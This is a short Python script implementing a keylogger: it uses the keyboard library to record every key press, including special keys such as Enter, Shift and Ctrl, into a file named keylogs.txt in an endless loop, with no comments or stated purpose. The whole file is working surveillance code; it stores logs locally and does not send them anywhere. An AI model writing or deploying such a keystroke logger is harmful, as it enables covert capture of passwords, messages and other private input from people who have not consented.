import keyboard

def log_keystrokes():
    with open("keylogs.txt", "a") as log_file:
        while True:
            try:
                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    key = event.name
                    if len(key) == 1 and key.isalnum():
                        log_file.write(key)
                    else:
                        special_keys = {
                            "enter": "[ENTER]",
                            "shift": "[SHIFT]",
                            "backspace": "[BACKSPACE]",
                            "ctrl": "[CTRL]",
                            "alt": "[ALT]"
                        }
                        log_file.write(special_keys.get(key, f"[{key.upper()}]"))
                    print(event.name)
            except Exception as e:
                print(f"Error: {e}")

if __name__ == "__main__":
    log_keystrokes()
